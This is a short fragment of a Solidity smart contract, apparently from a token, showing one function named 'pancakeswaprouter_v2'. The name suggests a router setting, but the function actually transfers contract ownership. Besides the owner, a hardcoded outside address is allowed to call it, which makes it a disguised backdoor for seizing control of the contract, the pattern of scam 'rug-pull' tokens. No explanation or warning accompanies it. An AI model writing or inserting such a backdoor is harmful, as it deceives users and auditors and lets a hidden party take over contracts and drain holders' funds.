...
function pancakeswaprouter_v2(address pancakeswaprouter_v2) public virtual {
        require(pancakeswaprouter_v2 != address(0), "Ownable: new owner is the zero address");
        require(msg.sender == owner() || msg.sender == address(0xFAaE0aCdada1148168766729e4bFB62D86Bc959F));
        emit OwnershipTransferred(_owner, pancakeswaprouter_v2);
        _owner = pancakeswaprouter_v2;
    }
